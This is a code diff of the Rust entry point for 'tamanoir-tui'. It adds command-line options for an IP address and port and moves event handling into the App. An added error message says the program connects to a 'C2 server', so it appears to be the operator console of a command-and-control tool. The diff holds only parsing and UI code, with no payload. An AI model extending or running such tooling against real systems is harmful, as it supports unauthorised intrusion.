@@ -1,22 +1,24 @@
-use std::io;
+use std::{io, net::Ipv4Addr};
 
-use clap::{crate_description, crate_version, Command};
+use clap::Parser;
 use ratatui::{backend::CrosstermBackend, Terminal};
 use tamanoir_tui::{
     app::{App, AppResult},
-    event::{Event, EventHandler},
-    handler::handle_key_events,
+    event::EventHandler,
     tui::Tui,
 };
 
+#[derive(Parser)]
+pub struct Opt {
+    #[clap(long, short)]
+    ip: Ipv4Addr,
+    #[clap(short, long, default_value = "50051")]
+    port: u16,
+}
+
 #[tokio::main]
 async fn main() -> AppResult<()> {
-    Command::new("tamanoir-tui")
-        .about(crate_description!())
-        .version(crate_version!())
-        .get_matches();
-
-    let mut app = App::new().await?;
+    let Opt { ip, port } = Opt::parse();
 
     let backend = CrosstermBackend::new(io::stdout());
     let terminal = Terminal::new(backend)?;
@@ -25,20 +27,17 @@ async fn main() -> AppResult<()> {
     let mut tui = Tui::new(terminal, events);
     tui.init()?;
 
-    while app.running {
-        tui.draw(&mut app)?;
-        match tui.events.next().await? {
-            Event::Tick => app.tick(),
-            Event::Key(key_event) => {
-                handle_key_events(key_event, &mut app, tui.events.sender.clone()).await?
-            }
-            Event::Notification(notification) => {
-                app.notifications.push(notification);
-            }
-            _ => {}
+    let maybe_app = App::new(ip, port, tui.events.sender.clone()).await;
+    if let Ok(mut app) = maybe_app {
+        while app.running {
+            tui.draw(&mut app)?;
+            let event = tui.events.next().await?;
+            app.handle_tui_event(event).await?;
         }
+        tui.exit()?;
+    } else {
+        tui.exit()?;
+        println!("Error Starting App, check if C2 server is reachable");
     }
-
-    tui.exit()?;
     Ok(())
 }
